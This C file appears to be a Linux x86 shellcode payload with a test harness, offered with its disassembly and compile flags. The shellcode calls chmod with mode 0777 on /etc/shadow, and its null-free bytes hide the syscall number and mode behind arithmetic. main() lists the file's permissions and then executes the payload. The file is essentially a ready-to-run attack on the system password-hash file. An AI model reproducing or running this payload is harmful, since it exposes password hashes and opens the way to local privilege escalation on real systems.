#include <stdio.h>
#include <string.h>
/*
Disassembly of section .text:

00000000 <_start>:
   0:	b9 63 2f 73 68       	mov    ecx,0x68732f63
   5:	b8 2f 2f 65 74       	mov    eax,0x74652f2f
   a:	bb 61 64 6f 77       	mov    ebx,0x776f6461
   f:	52                   	push   edx
  10:	53                   	push   ebx
  11:	51                   	push   ecx
  12:	50                   	push   eax
  13:	89 e3                	mov    ebx,esp
  15:	2d 20 2f 65 74       	sub    eax,0x74652f20
  1a:	81 e9 64 2d 73 68    	sub    ecx,0x68732d64
  20:	cd 80                	int    0x80
  22:	b0 01                	mov    al,0x1
  24:	cd 80                	int    0x80

Compilation: gcc -m32 exploit.c -o exploit -fno-stack-protector -z execstack
*/
unsigned char shellcode[] = \
"\xb9\x63\x2f\x73\x68\xb8\x2f\x2f"
"\x65\x74\xbb\x61\x64\x6f\x77\x52"
"\x53\x51\x50\x89\xe3\x2d\x20\x2f"
"\x65\x74\x81\xe9\x64\x2d\x73\x68"
"\xcd\x80\xb0\x01\xcd\x80";

void main(void) {

	printf("File state before shellcode execution: \n");
	system("ls -la /etc/shadow");

	printf("\nShellcode lenght: %d\n", strlen(shellcode));

	__asm__ (
		"xor %eax, %eax\n\t"
		"xor %ebx, %ebx\n\t"
		"xor %ecx, %ecx\n\t"
		"xor %edx, %edx\n\t"
		
		"call shellcode"
	);
}